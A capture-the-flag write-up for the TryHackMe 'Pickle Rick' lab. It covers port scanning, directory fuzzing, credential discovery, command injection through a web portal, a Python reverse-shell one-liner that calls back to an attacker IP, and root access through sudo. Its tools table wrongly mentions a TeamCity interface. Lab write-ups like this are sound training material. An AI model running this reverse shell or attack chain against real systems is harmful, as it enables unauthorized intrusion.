# PickleRick - TryHackMe — CTF Writeup

-   **OS:** Linux
-   **Target IP:** `10.113.185.115`

------------------------------------------------------------------------

## Enumeration

### Nmap Scan

Starting with a service and port scan using Nmap:

``` bash
nmap -sC -sV -A 10.113.185.115
```

**Output:**

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
    80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
    |_http-title: Rick is sup4r cool

Two open ports were found:

-   **22** --- SSH
-   **80** --- Apache HTTP server running on Ubuntu

------------------------------------------------------------------------

### Web Inspection

Inspecting the page source reveals a hidden comment with a username:

``` html
<!-- Note to self, remember username! Username: R1ckRul3s -->
```

### Directory Fuzzing

Proceeding with directory enumeration using ffuf:

``` bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt      -u http://10.113.185.115/FUZZ      -e .php,.txt,.html,.bak      -fs 279      -t 100 2>/dev/null
```

**Output:**

    assets      [Status: 301]
    denied.php  [Status: 302]
    index.html  [Status: 200]
    login.php   [Status: 200]
    portal.php  [Status: 302]
    robots.txt  [Status: 200]

The most interesting findings are:

-   `login.php`
-   `robots.txt`

Inside `robots.txt` the string `Wubbalubbadubdub` is present, which
appears to be a password.

------------------------------------------------------------------------

## Exploitation

### Initial Access

Using discovered credentials on `login.php`:

-   **Username:** R1ckRul3s\
-   **Password:** Wubbalubbadubdub

Authentication succeeds and redirects to `portal.php`, which contains a
command input field vulnerable to Remote Code Execution.

Running `ls` reveals:

    Sup3rS3cretPickl3Ingred.txt
    assets
    clue.txt
    denied.php
    index.html
    login.php
    portal.php
    robots.txt

Attempting to read the ingredient directly results in access denied, so
a reverse shell is required.

### Reverse Shell

Setting up a listener on the attacker machine:

``` bash
nc -lvnp 4444
```

Finding the attacker THM network IP:

``` bash
ip a
# 192.168.142.170
```

Launching the reverse shell from the portal input:

``` bash
python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("192.168.142.170",4444));[os.dup2(s.fileno(),i)for i in range(3)];pty.spawn("/bin/bash")'
```

Reverse shell obtained successfully.

Checking current user:

``` bash
whoami
# www-data
```

Reading the first ingredient:

``` bash
cat Sup3rS3cretPickl3Ingred.txt
# mr. meeseek hair
```

Navigating to Rick's home directory:

``` bash
cat '/home/rick/second ingredients'
# 1 jerry tear
```

------------------------------------------------------------------------

## Privilege Escalation

Checking sudo permissions:

``` bash
sudo -l
```

**Output:**

    (ALL) NOPASSWD: ALL

The `www-data` user can execute any command as root without a password
due to a misconfigured `/etc/sudoers`.

Accessing the root directory:

``` bash
sudo ls /root
# 3rd.txt

sudo cat /root/3rd.txt
# 3rd ingredients: fleeb juice
```

Root access successfully obtained.

------------------------------------------------------------------------

## Tools Summary

| Tool | Purpose | Usage |
|------|---------|-------|
| Nmap | Network scanner | Port discovery and service/version detection |
| ffuf | Web fuzzer | Directory and file enumeration on the TeamCity web interface |
| Netcat | Listener | Reverse shell connection |
| Python3 | Exploitation | Reverse shell execution |
